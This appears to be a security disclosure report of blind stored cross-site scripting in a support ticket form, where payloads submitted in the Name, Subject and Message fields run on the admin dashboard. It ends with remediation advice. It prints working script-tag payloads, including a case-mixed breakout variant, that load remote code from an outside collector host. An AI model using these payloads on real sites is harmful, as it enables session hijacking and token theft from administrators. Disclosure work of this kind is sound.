## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Ticket Name, Subject, and Message Fields on ZAP Support Admin Dashboard.

## Affected URL

https://contact.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the support ticket submission handler of the ZAP Support platform. User-supplied input submitted through ticket fields (such as Name, Subject, and Message) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping.

When an administrative user reviews submitted support tickets within the admin panel (`index.php?view=admin`), the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the administrative user's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application support submission interface: `https://contact.pwnedbox.site/`.
2. Locate the create ticket form and inject JavaScript payloads into input fields (e.g., entering `'"&><ScriPt src=https://xss.report/c/vansh> </ScriPt>` into the Name, Subject, and Message fields)[cite: 20].
3. Complete any required verification and submit the support ticket.
4. Log into the administrative control panel where stored tickets are reviewed (`https://contact.pwnedbox.site/index.php?view=admin` or ticket detail view).
5. Observe that the stored payload executes in the DOM of the administrative dashboard, firing requests to the external collector (`xss.report`).

## POC

<img width="561" height="565" alt="image" src="https://github.com/user-attachments/assets/4e75f375-257e-4515-bdb1-833681cb152b" />

<img width="1718" height="1059" alt="image" src="https://github.com/user-attachments/assets/ba756c0f-31e6-4832-9e04-e99056bdda4c" />

### Vulnerable DOM Snippet

```html
<div class="card" id="ticketDetail">
  <div class="card-header">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path></svg>
    Ticket Details
  </div>
  <div class="card-body" id="ticketDetailBody">
    <div class="detail-field">
      <div class="detail-label">From (Email)</div>
      <div class="detail-val">asd@gmail.com</div>
    </div>
    <div class="detail-field">
      <div class="detail-label">IP Address</div>
      <div class="detail-val">2405:201:2036:9006:497:b877:1d40:8969</div>
    </div>
    <div class="detail-field">
      <div class="detail-label">User-Agent</div>
      <div class="detail-val">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:159.0) Gecko/20100101 Firefox/159.0</div>
    </div>
    <div class="detail-field">
      <div class="detail-label">Name (optional)</div>
      <div class="detail-val" id="dName">'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></div>
    </div>
    <div class="detail-field">
      <div class="detail-label">Subject</div>
      <div class="detail-val" id="dSubject">'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></div>
    </div>
    <div class="detail-field">
      <div class="detail-label">Message</div>
      <div class="detail-val" id="dMessage" style="min-height:80px;">'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></div>
    </div>
    <div class="detail-field">
      <div class="detail-label">Submitted</div>
      <div class="detail-val">5h ago</div>
    </div>
  </div>
</div>
```
## Impact
Execution of arbitrary JavaScript code within the high-privilege session of an administrator reviewing stored support tickets.

Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of support ticket statuses or application data.

Persistent code execution affecting backend triage handlers and support agent review dashboards.

## Remediation
Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in administrative tables, dashboards, or detail views.

Apply strict input validation and sanitization policies on all support ticket submission endpoints (Name, Subject, Message fields) to reject or neutralize HTML markup and script tags.

Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
